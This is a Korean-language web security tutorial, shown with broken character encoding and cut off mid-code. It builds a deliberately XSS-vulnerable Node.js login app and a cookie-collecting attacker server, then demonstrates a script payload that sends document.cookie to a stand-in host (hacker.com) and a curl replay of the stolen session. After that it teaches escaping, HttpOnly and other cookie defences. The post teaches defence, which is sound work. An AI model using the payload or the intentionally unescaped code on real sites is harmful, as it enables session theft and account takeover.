---
title: ì„¸ì…˜ í•˜ì´ì¬í‚¹ ì™„ë²½ ê°€ì´ë“œ - ì¿ í‚¤ íƒˆì·¨(XSS) ê³µê²©ê³¼ HttpOnly ë°©ì–´ë²•
date: 2025-09-03
updatedDate: 2025-09-03
tags:
  [
    ì„¸ì…˜í•˜ì´ì¬í‚¹,
    SessionHijacking,
    ì›¹ë³´ì•ˆ,
    ì¿ í‚¤íƒˆì·¨,
    HttpOnly,
    XSSê³µê²©,
    ì›¹ì·¨ì•½ì ,
  ]
category: HTTP
image: '/images/security-session-hijacking/thumbnail.png'
---

# ì„¸ì…˜ í•˜ì´ì¬í‚¹(Session Hijacking) ì™„ë²½ ê°€ì´ë“œ: ì‹¤ìŠµìœ¼ë¡œ ì´í•´í•˜ëŠ” ì¿ í‚¤ íƒˆì·¨ ê³µê²©

"ë¡œê·¸ì¸ëœ ì‚¬ìš©ìì˜ ì„¸ì…˜ì„ í›”ì³ì„œ ê·¸ ì‚¬ëŒì¸ ê²ƒì²˜ëŸ¼ í–‰ë™í•  ìˆ˜ ìˆë‹¤ë©´?"

ì›¹ ê°œë°œìë¼ë©´ í•œ ë²ˆì¯¤ ì´ëŸ° ì§ˆë¬¸ì„ ë°›ì•„ë³´ì…¨ì„ ê²ë‹ˆë‹¤. ë°”ë¡œ **ì„¸ì…˜ í•˜ì´ì¬í‚¹(Session Hijacking)**ì´ë¼ëŠ” ê³µê²© ê¸°ë²•ì…ë‹ˆë‹¤.

ì´ë²ˆ í¬ìŠ¤íŠ¸ì—ì„œëŠ” `Node.js`ë¡œ ì§ì ‘ **ì·¨ì•½í•œ ì¸ì¦ ì‹œìŠ¤í…œ**ì„ êµ¬í˜„í•˜ê³ , **ì‹¤ì œ ê³µê²©**ì„ ì‹œì—°í•œ í›„, **ë°©ì–´ ë°©ë²•**ê¹Œì§€ ë‹¨ê³„ë³„ë¡œ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.

![ì„¸ì…˜ í•˜ì´ì¬í‚¹ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤](/images/security-session-hijacking/thumbnail.png)

## 1. ì„¸ì…˜ê³¼ ì¿ í‚¤: ì›¹ ì¸ì¦ì˜ ê¸°ë³¸ ì´í•´í•˜ê¸°

### HTTPëŠ” ìƒíƒœê°€ ì—†ë‹¤(Stateless)

`HTTP` í”„ë¡œí† ì½œì€ **ë¬´ìƒíƒœ(Stateless)** íŠ¹ì„±ì„ ê°€ì§‘ë‹ˆë‹¤. ì¦‰, ì„œë²„ëŠ” ì´ì „ ìš”ì²­ì„ ê¸°ì–µí•˜ì§€ ëª»í•©ë‹ˆë‹¤. ê·¸ë ‡ë‹¤ë©´ ì–´ë–»ê²Œ ë¡œê·¸ì¸ ìƒíƒœë¥¼ ìœ ì§€í• ê¹Œìš”?

**ë‹µì€ ì„¸ì…˜(Session)ê³¼ ì¿ í‚¤(Cookie)ì…ë‹ˆë‹¤.**

### ì›¹ ì¸ì¦ í”„ë¡œì„¸ìŠ¤

1.  **ë¡œê·¸ì¸ ìš”ì²­**: ì‚¬ìš©ìê°€ ì•„ì´ë””/ë¹„ë°€ë²ˆí˜¸ ì…ë ¥
2.  **ì¸ì¦ ê²€ì¦**: ì„œë²„ê°€ DBì™€ ëŒ€ì¡°í•˜ì—¬ ì‹ ì› í™•ì¸
3.  **ì„¸ì…˜ ìƒì„±**: ì¸ì¦ ì„±ê³µ ì‹œ ì„œë²„ê°€ ê³ ìœ í•œ ì„¸ì…˜ ID ë°œê¸‰
4.  **ì¿ í‚¤ ì „ì†¡**: ì„¸ì…˜ IDë¥¼ ì¿ í‚¤ì— ë‹´ì•„ ë¸Œë¼ìš°ì €ë¡œ ì „ì†¡
5.  **ìƒíƒœ ìœ ì§€**: ì´í›„ ëª¨ë“  ìš”ì²­ì— ì¿ í‚¤ê°€ ìë™ìœ¼ë¡œ í¬í•¨ë¨

ì´ì œ ì´ ê³¼ì •ì„ ì½”ë“œë¡œ ì§ì ‘ êµ¬í˜„í•´ë³´ê² ìŠµë‹ˆë‹¤.

---

## 2. ì·¨ì•½í•œ ì¸ì¦ ì‹œìŠ¤í…œ êµ¬í˜„í•˜ê¸°

### ê¸°ë³¸ ì„œë²„ êµ¬ì¡°ì™€ ì„¸ì…˜ ì €ì¥ì†Œ

ë¨¼ì € ë©”ëª¨ë¦¬ ê¸°ë°˜ì˜ ê°„ë‹¨í•œ ì„¸ì…˜ ì €ì¥ì†Œë¥¼ ë§Œë“¤ì–´ë³´ê² ìŠµë‹ˆë‹¤:

```javascript
const database = {
  products: ['êµ°ê³ êµ¬ë§ˆ', 'ê³ êµ¬ë§ˆ ì•„ì´ìŠ¤í¬ë¦¼'],
  // ì„¸ì…˜ ì €ì¥ì†Œ ì¶”ê°€ - ì‹¤ì œë¡œëŠ” Redisë‚˜ DBë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤
  session: {},
};
```

### ë¡œê·¸ì¸ í•¸ë“¤ëŸ¬ êµ¬í˜„

ì‹¤ì œ ì„œë¹„ìŠ¤ì—ì„œëŠ” **bcrypt**, **jose** ê°™ì€ í•´ì‹± ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì§€ë§Œ, ì´í•´ë¥¼ ë•ê¸° ìœ„í•´ ê°„ë‹¨í•˜ê²Œ êµ¬í˜„í•˜ê² ìŠµë‹ˆë‹¤:

```javascript
const login = (req, res) => {
  // ì¼ë‹¨ì€ timestampë¡œ ì„¸ì…˜ ì•„ì´ë””ë¥¼ ë§Œë“¬
  const createSession = () => `session-id-${Date.now()}`;
  // ì‚¬ìš©ì ì°¾ëŠ” í•¨ìˆ˜
  const findUser = () => ({
    name: 'Matthew',
    email: 'dydals3440@gmail.com',
  });

  const sid = createSession();
  const user = findUser();

  // ë¡œê·¸ì¸ ì™„ë£Œ -> ì„¸ì…˜ ì •ë³´ ì €ì¥
  database.session = {
    [sid]: user,
  };

  // ì°¸ê³ : 301ì€ ì˜êµ¬ ë¦¬ë‹¤ì´ë ‰ì…˜ì´ë¼ ë¸Œë¼ìš°ì €ê°€ í•œ ë²ˆ ë°›ìœ¼ë©´ ê³„ì† ìºì‹œí•˜ëŠ” íŠ¹ì„±ì´ ìˆìŠµë‹ˆë‹¤.
  // ì‚¬ìš©ìí•œí…ŒëŠ” "/"ë¡œ redirectioní•˜ê³ 
  // ì„¸ì…˜ ì•„ì´ë””ë¥¼ ì¿ í‚¤ì— ì €ì¥
  res.statusCode = 302;
  res.setHeader('Location', '/');
  res.setHeader('Set-Cookie', `sid=${sid}`);
  res.end();
};

// ë¼ìš°íŒ… ì„¤ì •
const server = http.createServer((req, res) => {
  const { pathname } = new URL(req.url, `http://${req.headers.host}`);

  if (pathname === '/login') return login(req, res);
  if (pathname === '/logout') return logout(req, res);
  if (pathname === '/product') return postProduct(req, res);

  index(req, res);
});

server.listen(8080, () => {
  console.log('ğŸš€ Server is running on http://localhost:8080');
});
```

### ì¿ í‚¤ íŒŒì‹± ìœ í‹¸ë¦¬í‹°

ë¸Œë¼ìš°ì €ê°€ ë³´ë‚¸ ì¿ í‚¤ë¥¼ íŒŒì‹±í•˜ëŠ” í•¨ìˆ˜ê°€ í•„ìš”í•©ë‹ˆë‹¤:

```javascript
const parseCookie = (req) => {
  // ì—†ì„ ìˆ˜ ë„ ìˆìœ¼ë‹ˆ fallback ì²˜ë¦¬
  // ì¿ í‚¤ê°€ ì—¬ëŸ¬ê°œ ì˜¬ ìˆ˜ ìˆìœ¼ë‹ˆ .split()
  const cookies = (req.headers.cookie || '').split(';');
  // ìˆœíšŒí•˜ë©´ì„œ, ì˜¤ë¸Œì íŠ¸ë¡œ ë§Œë“¬
  const cookieObject = {};
  cookies.forEach((cookie) => {
    const [name, value] = cookie.trim().split('=');
    // ì¡°ê¸ˆ ë” ì •í™•íˆí• ë ¤ë©´ decodeURIComponent ì²˜ë¦¬
    if (name && value) {
      cookieObject[decodeURIComponent(name)] = decodeURIComponent(value);
    }
  });
  // ì™„ì„±ëœ ì¿ í‚¤ ì˜¤ë¸Œì íŠ¸ ë°˜í™˜
  return cookieObject;
};
```

### ì„¸ì…˜ ê¸°ë°˜ ì‚¬ìš©ì ì¸ì¦ í™•ì¸

ì´ì œ `index` í˜ì´ì§€ì—ì„œ ì„¸ì…˜ì„ í™•ì¸í•˜ì—¬ ì‚¬ìš©ì ì •ë³´ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤:

```javascript
const index = (req, res) => {
  // sidë¥¼ ì¿ í‚¤ë¡œ ë¶€í„° ë½‘ì•„ëƒ„
  // ì¿ í‚¤ë¥¼ ê°ì²´í˜•ì‹ìœ¼ë¡œ ë°›ìŒ ì—†ì„ ìˆ˜ ë„ ìˆìœ¼ë‹ˆ fallback ì²˜ë¦¬
  const sid = parseCookie(req).sid || '';
  // ê·¸ëŸ¬ë©´ ì´ì œ sidë¥¼ í†µí•´ì„œ ì„œë²„ DB ì—ì„œ ì„¸ì…˜ ì €ì¥ì†Œë¥¼ ì¡°íšŒ ê°€ëŠ¥
  // ì¸ì¦ëœ ìœ ì €ë¼ë©´ ìœ ì € ì •ë³´ê°€ ìˆìŒ.
  const userAccount = database.session[sid] || '';
  // ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë™ì  HTML ì„ ìƒì„±

  res.setHeader('Content-Type', 'text/html');
  res.write(`
    <!DOCTYPE html>
    <html>
    <head>
       <meta charset="utf-8">
       <style>input {width: 600px;}</style>
    </head>
    <body>
    ${
      userAccount
        ? `<p>ì•ˆë…•í•˜ì„¸ìš”, ${userAccount.name}, ${userAccount.email}</p>`
        : '<p>ì†ë‹˜</p>'
    }
    <form method="POST" action="/product">
    <input name="product" type="text"/>
    <button type="submit">Add</button>
    </form>
    <ul>
    ${database.products.map((product) => `<li>${product}</li>`).join('')}
    </ul>
    </body>
    </html>`);
  res.end();
};
```

### ë¡œê·¸ì•„ì›ƒ êµ¬í˜„

ì„¸ì…˜ì„ ì‚­ì œí•˜ê³  ì¿ í‚¤ë¥¼ ì œê±°í•˜ëŠ” ë¡œê·¸ì•„ì›ƒ ê¸°ëŠ¥ì„ êµ¬í˜„í•´ë³´ê² ìŠµë‹ˆë‹¤:

```javascript
// í•´ë‹¹ ì„¸ì…˜ ì•„ì´ë””ë¥¼ ì§€ìš°ë©´ ë¨
const logout = (req, res) => {
  const sid = parseCookie(req)['sid'] || '';

  delete database.session[sid];

  // 301 ìœ¼ë¡œ redirection í•˜ê³ 
  // ì¿ í‚¤ì— ìˆëŠ” sid ì‚­ì œ
  res.statusCode = 302;
  res.setHeader('Location', '/');
  res.setHeader('Set-Cookie', 'sid=;Max-Age=-1');
  res.end();
};
```

### ì‹¤í–‰ ê²°ê³¼

ì„œë²„ë¥¼ ì‹¤í–‰í•˜ê³  í…ŒìŠ¤íŠ¸í•´ë³´ê² ìŠµë‹ˆë‹¤:

```bash
node vulnerable-app.js
# http://localhost:8080 ì ‘ì†
```

**1. ì´ˆê¸° í™”ë©´ (ë¡œê·¸ì¸ ì „)**
![ë£¨íŠ¸ ê²½ë¡œì˜ í™”ë©´](/images/security-session-hijacking/1.png)

**2. ë¡œê·¸ì¸ í›„ í™”ë©´**
![ë¡œê·¸ì¸ í›„ ìœ ì € ì •ë³´ê°€ ë³´ì´ëŠ” í™”ë©´](/images/security-session-hijacking/2.png)

`/login` ê²½ë¡œ ì ‘ì† ì‹œ ì„¸ì…˜ì´ ìƒì„±ë˜ê³ , ì‚¬ìš©ì ì •ë³´ê°€ í‘œì‹œë©ë‹ˆë‹¤.

**3. ë¡œê·¸ì•„ì›ƒ í›„ í™”ë©´**

![ë¡œê·¸ì•„ì›ƒ í›„ ìœ ì € ì •ë³´ê°€ ë³´ì´ì§€ ì•ŠëŠ” í™”ë©´](/images/security-session-hijacking/3.png)

ë¡œê·¸ì•„ì›ƒ ì‹œ `Max-Age=-1`ë¡œ ì¿ í‚¤ê°€ ì¦‰ì‹œ ë§Œë£Œë˜ì–´ ë‹¤ì‹œ ì†ë‹˜ ìƒíƒœë¡œ ëŒì•„ê°‘ë‹ˆë‹¤.

---

## 3. ì„¸ì…˜ í•˜ì´ì¬í‚¹ ê³µê²© ì‹œì—°

ì´ì œ ë³¸ê²©ì ìœ¼ë¡œ **ì„¸ì…˜ í•˜ì´ì¬í‚¹ ê³µê²©**ì„ ì‹œì—°í•´ë³´ê² ìŠµë‹ˆë‹¤.

### XSSë¥¼ ì´ìš©í•œ ì¿ í‚¤ íƒˆì·¨ ì‹œë‚˜ë¦¬ì˜¤

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:**

1. ê³µê²©ìê°€ XSS ì·¨ì•½ì ì„ ì´ìš©í•´ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì£¼ì…
2. ë‹¤ë¥¸ ì‚¬ìš©ìê°€ í˜ì´ì§€ ë°©ë¬¸ ì‹œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
3. ìŠ¤í¬ë¦½íŠ¸ê°€ ì„¸ì…˜ ì¿ í‚¤ë¥¼ ê³µê²©ì ì„œë²„ë¡œ ì „ì†¡
4. ê³µê²©ìê°€ íƒˆì·¨í•œ ì„¸ì…˜ìœ¼ë¡œ í”¼í•´ì ê³„ì • ì ‘ê·¼

### ê³µê²©ì ì„œë²„ êµ¬ì¶•

ë¨¼ì € íƒˆì·¨í•œ ì¿ í‚¤ë¥¼ ìˆ˜ì§‘í•  ê³µê²©ì ì„œë²„ë¥¼ ë§Œë“¤ì–´ë³´ê² ìŠµë‹ˆë‹¤:

**attacker-server.js**

```javascript
const http = require('http');

// ìš”ì²­ URLì„ ë¡œê¹…
// íƒˆì·¨í•œ ì •ë³´ê°€ ìš”ì²­ URLë¡œ ì˜´.
const log = (req, res) => console.log(`${req.method} ${req.url}`);

const server = http.createServer((req, res) => {
  // ëª¨ë“  ìš”ì²­ì„ ê¸°ë¡í•©ë‹ˆë‹¤.
  log(req, res);

  // CORS í—¤ë” ì¶”ê°€ (í¬ë¡œìŠ¤ ì˜¤ë¦¬ì§„ ìš”ì²­ í—ˆìš©)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // ë¹ˆ ì‘ë‹µì„ ë³´ëƒˆìŠµë‹ˆë‹¤.
  res.end();
});

// ì–´í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ì™€ ë‹¤ë¥¸ í¬íŠ¸ë¥¼ ì‚¬ìš©í•´ ìš”ì²­ ëŒ€ê¸°
server.listen(8081, () => {
  console.log('Attacker server is running on port 8081');
});
```

### ë¡œì»¬ DNS ì„¤ì • (ì‹¤ìŠµ í™˜ê²½)

ì‹¤ì œ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì¬í˜„í•˜ê¸° ìœ„í•´ ë¡œì»¬ DNSë¥¼ ì„¤ì •í•©ë‹ˆë‹¤:

```bash
sudo vi /private/etc/hosts

# ì•„ë˜ ë‚´ìš© ì¶”ê°€
127.0.0.1   matthew.com
127.0.0.1   hacker.com
```

![ë¡œì»¬ DNS ì„¤ì •](/images/security-session-hijacking/4.png)

**matthew.com**: ì •ìƒ ì„œë¹„ìŠ¤ ë„ë©”ì¸ (í¬íŠ¸ 8080)
**hacker.com**: ê³µê²©ì ì„œë²„ ë„ë©”ì¸ (í¬íŠ¸ 8081)

### XSS ì·¨ì•½ì  í™œì„±í™”

ì‹¤ìŠµì„ ìœ„í•´ ì¼ì‹œì ìœ¼ë¡œ **ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬ë¥¼ ì œê±°**í•©ë‹ˆë‹¤:

:::warning

**ê²½ê³ : ì‹¤ì œ ì„œë¹„ìŠ¤ì—ì„œëŠ” ì ˆëŒ€ ì´ë ‡ê²Œ í•˜ì§€ ë§ˆì„¸ìš”!**

:::

```javascript
const postProduct = (req, res) => {
  let body = '';
  req.on('data', (chunk) => {
    body = body + chunk.toString();
  });

  req.on('end', () => {
    const { product } = queryString.parse(body);
    //// ì„ì‹œ ì œê±°
    // const escapedProduct = product
    //   .replace(/&/g, '&amp;')
    //   .replace(/</g, '&lt;')
    //   .replace(/>/g, '&gt;');

    database.products.push(product);

    res.statusCode = 302;
    res.setHeader('Location', '/');
    res.end();
  });
};
```

### ê³µê²© ì‹¤í–‰

ì´ì œ ë‘ ì„œë²„ë¥¼ ëª¨ë‘ ì‹¤í–‰í•˜ê³  ê³µê²©ì„ ì‹œì—°í•´ë³´ê² ìŠµë‹ˆë‹¤:

```bash
# í„°ë¯¸ë„ 1: ë©”ì¸ ì„œë²„ ì‹¤í–‰
node vulnerable-app.js

# í„°ë¯¸ë„ 2: ê³µê²©ì ì„œë²„ ì‹¤í–‰
node attacker-server.js
```

**1ë‹¨ê³„: ë¡œê·¸ì¸í•˜ì—¬ ì„¸ì…˜ ìƒì„±**

- `http://matthew.com:8080/login` ì ‘ì†
- ì„¸ì…˜ì´ ìƒì„±ë˜ê³  ì¿ í‚¤ê°€ ë¸Œë¼ìš°ì €ì— ì €ì¥ë¨

**2ë‹¨ê³„: ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì£¼ì…**

ìƒí’ˆ ì…ë ¥ë€ì— ë‹¤ìŒ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì…ë ¥í•©ë‹ˆë‹¤:

```html
<script>
  // document.cookieë¡œ í˜„ì¬ í˜ì´ì§€ì˜ ëª¨ë“  ì¿ í‚¤ ì ‘ê·¼
  fetch('http://hacker.com:8081/steal?cookie=' + document.cookie);
</script>
```

![ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì£¼ì…](/images/security-session-hijacking/5.png)

ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ”:

1. `document.cookie`ë¡œ í˜„ì¬ í˜ì´ì§€ì˜ **ëª¨ë“  ì¿ í‚¤**ë¥¼ ì½ìŒ
2. `fetch()`ë¥¼ í†µí•´ ê³µê²©ì ì„œë²„ë¡œ **HTTP ìš”ì²­** ì „ì†¡
3. ì¿ í‚¤ ê°’ì„ **ì¿¼ë¦¬ íŒŒë¼ë¯¸í„°**ë¡œ í¬í•¨ì‹œí‚´

**3ë‹¨ê³„: ì¿ í‚¤ íƒˆì·¨ í™•ì¸**

ë¸Œë¼ìš°ì € ê°œë°œì ë„êµ¬ì˜ ë„¤íŠ¸ì›Œí¬ íƒ­ì„ í™•ì¸í•˜ë©´:

![ì¿ í‚¤ê°€ ì¿¼ë¦¬ ë¬¸ìì—´ì— ë‹´ê²¨ ì „ë‹¬](/images/security-session-hijacking/6.png)

ê³µê²©ì ì„œë²„ì˜ ë¡œê·¸ë¥¼ í™•ì¸í•˜ë©´:

![í•´ì»¤ ì„œë²„ì— ì„¸ì…˜ ì •ë³´ê°€ ë¡œê¹…ë¨](/images/security-session-hijacking/7.png)

:::warning

**ì„¸ì…˜ IDê°€ ì„±ê³µì ìœ¼ë¡œ íƒˆì·¨ë˜ì—ˆìŠµë‹ˆë‹¤!** ğŸš¨

:::

### íƒˆì·¨í•œ ì„¸ì…˜ìœ¼ë¡œ ê³„ì • ì ‘ê·¼

ì´ì œ ê³µê²©ìëŠ” `íƒˆì·¨í•œ ì„¸ì…˜ ID`ë¥¼ ì‚¬ìš©í•´ **Matthew**ì˜ ì„¸ì…˜ì„ ê°€ì§€ê³  ìˆëŠ” ê²ƒì²˜ëŸ¼ í–‰ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```bash
curl http://matthew.com:8080 -H "Cookie: sid=session-id-1756852495508"
```

ì‘ë‹µ ê²°ê³¼:

![ì„¸ì…˜ ì •ë³´ë¥¼ í™œìš©í•œ ë¬´ë‹¨ ì ‘ê·¼](/images/security-session-hijacking/8.png)

**ê³µê²©ìê°€ Matthewì˜ ê³„ì •ì— ì™„ì „íˆ ì ‘ê·¼í–ˆìŠµë‹ˆë‹¤!** ğŸ˜±

ì´ê²ƒì´ ë°”ë¡œ `ì„¸ì…˜ í•˜ì´ì¬í‚¹(Session Hijacking)`ì…ë‹ˆë‹¤.

:::info

**"í•˜ì´ì¬í‚¹(Hijacking)"ì˜ ì–´ì›**

:::

> ìš´í•­ ì¤‘ì¸ ë¹„í–‰ê¸°ë¥¼ ë‚©ì¹˜í•˜ëŠ” ê²ƒì„ í•˜ì´ì¬í‚¹ì´ë¼ê³  ë¶€ë¥´ë“¯ì´, ì‹¤í–‰ ì¤‘ì¸ ì„¸ì…˜ì„ ê°€ë¡œì±„ëŠ” ì´ ê³µê²©ì„ `ì„¸ì…˜ í•˜ì´ì¬í‚¹`ì´ë¼ê³  ë¶€ë¦…ë‹ˆë‹¤.

---

## 4. ì„¸ì…˜ í•˜ì´ì¬í‚¹ ë°©ì–´ ì „ëµ

### ë°©ë²• 1: XSS ì·¨ì•½ì  ì œê±°

ê°€ì¥ ê·¼ë³¸ì ì¸ í•´ê²°ì±…ì€ **XSS ê³µê²© ìì²´ë¥¼ ì°¨ë‹¨**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:

```javascript
const postProduct = (req, res) => {
  // ... ìƒëµ ...

  req.on('end', () => {
    const { product } = queryString.parse(body);

    // HTML íŠ¹ìˆ˜ë¬¸ì ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬
    const escapedProduct = product
      .replace(/&/g, '&amp;') // & â†’ &amp;
      .replace(/</g, '&lt;') // < â†’ &lt;
      .replace(/>/g, '&gt;'); // > â†’ &gt;

    database.products.push(escapedProduct);
    // ... ìƒëµ ...
  });
};
```

### ë°©ë²• 2: HttpOnly ì¿ í‚¤ í”Œë˜ê·¸

**HttpOnly** í”Œë˜ê·¸ëŠ” JavaScriptì—ì„œ ì¿ í‚¤ ì ‘ê·¼ì„ ì°¨ë‹¨í•˜ëŠ” ê°•ë ¥í•œ ë°©ì–´ ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤:

**HttpOnly í”Œë˜ê·¸ì˜ íš¨ê³¼:**

- `document.cookie`ë¡œ ì ‘ê·¼ ë¶ˆê°€
- `XSS` ê³µê²©ìœ¼ë¡œë¶€í„° ì„¸ì…˜ ì¿ í‚¤ ë³´í˜¸
- `HTTP` ìš”ì²­ì—ëŠ” ì •ìƒì ìœ¼ë¡œ í¬í•¨ë¨

ì´ì œ ë¡œê·¸ì¸ í•¨ìˆ˜ë¥¼ ìˆ˜ì •í•´ë³´ê² ìŠµë‹ˆë‹¤:

```javascript
const login = (req, res) => {
  const createSession = () => `session-id-${Date.now()}`;
  const findUser = () => ({
    name: 'Matthew',
    email: 'dydals3440@gmail.com',
  });

  const sid = createSession();
  const user = findUser();

  database.session = {
    [sid]: user,
  };

  res.statusCode = 302;
  res.setHeader('Location', '/');
  // HttpOnly ë””ë ‰í‹°ë¸Œ ì¶”ê°€
  res.setHeader('Set-Cookie', `sid=${sid}; HttpOnly`);
  res.end();
};
```

### HttpOnly ì ìš© í›„ ê²°ê³¼

ë™ì¼í•œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì£¼ì…í•´ë„:

![HttpOnly ì ìš© í›„ ì¿ í‚¤ ì ‘ê·¼ ì°¨ë‹¨](/images/security-session-hijacking/9.png)

ë„¤íŠ¸ì›Œí¬ ìš”ì²­ì€ ë°œìƒí•˜ì§€ë§Œ **ì¿ í‚¤ ê°’ì´ ë¹„ì–´ìˆìŠµë‹ˆë‹¤**.

ê³µê²©ì ì„œë²„ ë¡œê·¸:

![ê³µê²©ì ì„œë²„ì— ì¿ í‚¤ê°’ì´ ì „ë‹¬ë˜ì§€ ì•ŠìŒ](/images/security-session-hijacking/10.png)

**ì¿¼ë¦¬ìŠ¤íŠ¸ë§ì— ì¿ í‚¤ê°’ì´ ë¹„ì–´ìˆë‹¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

---

## 5. ì¶”ê°€ì ì¸ ë³´ì•ˆ ê°•í™” ë°©ë²•

### í”„ë¡œë•ì…˜ì—ì„œ í•„ìˆ˜! ì¿ í‚¤ ë³´ì•ˆ ì™„ì „ ì •ë³µ

ìœ„ì—ì„œ `HttpOnly` í•˜ë‚˜ë§Œ ì¶”ê°€í–ˆì§€ë§Œ, ì‹¤ì œ ì„œë¹„ìŠ¤ì—ì„œëŠ” ì´ê²ƒë§Œìœ¼ë¡œëŠ” ë¶€ì¡±í•©ë‹ˆë‹¤.

ì•„ë˜ì™€ ê°™ì´ ë‹¤ì–‘í•œ `ì¿ í‚¤ ë””ë ‰í‹°ë¸Œ`ë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```javascript
const login = (req, res) => {
  // ... ìƒëµ ...

  // ğŸ‘‰ ì²˜ìŒì—ëŠ” ì´ë ‡ê²Œë§Œ í–ˆì—ˆëŠ”ë°...
  // res.setHeader('Set-Cookie', `sid=${sid}`);

  // ğŸ‘‰ ë³´ì•ˆ ì´ìŠˆ í„°ì§€ê³  ë‚œ í›„...
  const cookieOptions = [
    `sid=${sid}`,
    'HttpOnly', // XSS ê³µê²© ë°©ì–´
    'Secure', // HTTPSì—ì„œë§Œ ì „ì†¡ (ê°œë°œ í™˜ê²½ì—ì„œëŠ” ë¹¼ì„¸ìš”!)
    'SameSite=Strict', // CSRF ê³µê²© ë°©ì–´
    'Path=/', // íŠ¹ì • ê²½ë¡œì—ì„œë§Œ ì‚¬ìš©
    'Max-Age=3600', // 1ì‹œê°„ í›„ ìë™ ë§Œë£Œ (ë„ˆë¬´ ê¸¸ë©´ ìœ„í—˜!)
  ].join('; ');

  res.setHeader('Set-Cookie', cookieOptions);
  res.end();
};
```

### ğŸ¯ ê° í”Œë˜ê·¸ê°€ ë§‰ì•„ì£¼ëŠ” ê³µê²©

> âš ï¸ **ì¤‘ìš”**: SameSiteëŠ” CSRFë¥¼ "ì–´ëŠ ì •ë„" ë§‰ì•„ì£¼ì§€ë§Œ, ì™„ë²½í•œ ë°©ì–´ëŠ” ì•„ë‹™ë‹ˆë‹¤!  
> ì§„ì§œ CSRF ë°©ì–´ëŠ” **CSRF í† í°**ì´ë‚˜ **Custom Header ê²€ì¦**ì´ í•„ìš”í•©ë‹ˆë‹¤.

| í”Œë˜ê·¸       | ì–¸ì œ ì“°ë‚˜ìš”?        | ë§‰ì•„ì£¼ëŠ” ê³µê²©     | ì£¼ì˜ì‚¬í•­                      |
| ------------ | ------------------- | ----------------- | ----------------------------- |
| **HttpOnly** | í•„ìˆ˜! ë¬´ì¡°ê±´ ì¨ì•¼í•¨ | XSSë¡œ ì¿ í‚¤ í›”ì¹˜ê¸° | ê°œë°œì ë„êµ¬ì—ì„œë„ ì•ˆ ë³´ì„     |
| **Secure**   | HTTPS ì‚¬ìš© ì‹œ í•„ìˆ˜  | ì™€ì´íŒŒì´ í•´í‚¹     | localhostì—ì„œëŠ” ì œì™¸          |
| **SameSite** | ì™¸ë¶€ ë§í¬ê°€ ìˆë‹¤ë©´  | CSRF ê³µê²©         | StrictëŠ” UXì— ì˜í–¥ ì¤„ ìˆ˜ ìˆìŒ |
| **Max-Age**  | ë¯¼ê°í•œ ì„œë¹„ìŠ¤ë¼ë©´   | ì„¸ì…˜ ê³ ì •         | ë„ˆë¬´ ì§§ìœ¼ë©´ UX ë‚˜ë¹ ì§         |

### ğŸ›¡ï¸ ë” ê°•ë ¥í•œ ë³´ì•ˆì„ ìœ„í•œ 3ê°€ì§€ í…Œí¬ë‹‰

#### 1. ì˜ˆì¸¡ ë¶ˆê°€ëŠ¥í•œ ì„¸ì…˜ ID ë§Œë“¤ê¸°

```javascript
const crypto = require('crypto');

// âŒ ë‚˜ìœ ì˜ˆ: timestampë§Œ ì‚¬ìš© (ì˜ˆì¸¡ ê°€ëŠ¥!)
const badSession = () => `session-${Date.now()}`;

// âœ… ì¢‹ì€ ì˜ˆ: ì•”í˜¸í•™ì ìœ¼ë¡œ ì•ˆì „í•œ ëœë¤ ê°’
const createSecureSession = () => {
  return crypto.randomBytes(32).toString('hex');
  // ê²°ê³¼: 64ìë¦¬ ëœë¤ ë¬¸ìì—´
  // "a4f8c9b2e1d7..." ê°™ì€ í˜•íƒœ
};
```

#### 2. ì¤‘ìš”í•œ ì‘ì—… ì‹œ ì„¸ì…˜ ì¬ìƒì„±

```javascript
// ğŸ’¡ ì˜ˆì‹œ: ê²°ì œ ì „ ì„¸ì…˜ ì¬ìƒì„±
const processPayment = async (req, res) => {
  // 1. ê¸°ì¡´ ì„¸ì…˜ í™•ì¸
  const oldSid = parseCookie(req).sid;
  const user = database.session[oldSid];

  // 2. ìƒˆ ì„¸ì…˜ìœ¼ë¡œ êµì²´ (ì„¸ì…˜ ê³ ì • ê³µê²© ë°©ì–´)
  delete database.session[oldSid];
  const newSid = createSecureSession();
  database.session[newSid] = user;

  // 3. ê²°ì œ ì²˜ë¦¬
  await processUserPayment(user);

  // 4. ìƒˆ ì„¸ì…˜ ì¿ í‚¤ ë°œê¸‰
  res.setHeader('Set-Cookie', `sid=${newSid}; HttpOnly; Secure`);
};
```

#### 3. ë¹„ì •ìƒ ì ‘ì† íŒ¨í„´ ê°ì§€

```javascript
const validateSession = (req, sid) => {
  const session = database.session[sid];

  // ğŸ” ì˜ì‹¬ìŠ¤ëŸ¬ìš´ íŒ¨í„´ ì²´í¬
  const suspicious = [
    // IP ë³€ê²½ (ì¹´í˜ WiFi â†’ ì§‘ WiFi ê°™ì€ ê²½ìš°ë„ ìˆìœ¼ë‹ˆ ì£¼ì˜)
    session.ip !== req.connection.remoteAddress,
